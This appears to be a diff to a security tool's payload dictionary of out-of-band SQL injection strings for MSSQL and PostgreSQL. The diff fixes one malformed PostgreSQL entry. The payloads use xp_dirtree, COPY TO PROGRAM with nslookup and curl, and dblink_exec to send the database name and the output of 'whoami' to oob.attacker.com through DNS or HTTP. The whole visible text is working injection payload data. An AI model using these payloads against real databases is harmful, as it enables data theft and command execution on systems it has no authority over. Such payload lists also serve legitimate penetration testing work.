@@ -438,7 +438,7 @@ OOB_DNS_PAYLOADS: Dict[str, List[str]] = {
         "DECLARE @q varchar(1024); SET @q='\\\\\\\\'+db_name()+'.oob.attacker.com\\\\d'; EXEC master..xp_dirtree @q",
     ],
     "postgresql": [
-        "COPY (SELECT current_database()) TO PROGRAM 'nslookup '".'$.oob.attacker.com'",
+        "COPY (SELECT current_database()) TO PROGRAM 'nslookup oob.attacker.com'",
         "COPY (SELECT version()) TO PROGRAM 'curl http://oob.attacker.com/$(whoami)'",
         "PERFORM dblink_exec('host=oob.attacker.com dbname=x', 'SELECT 1')",
     ],
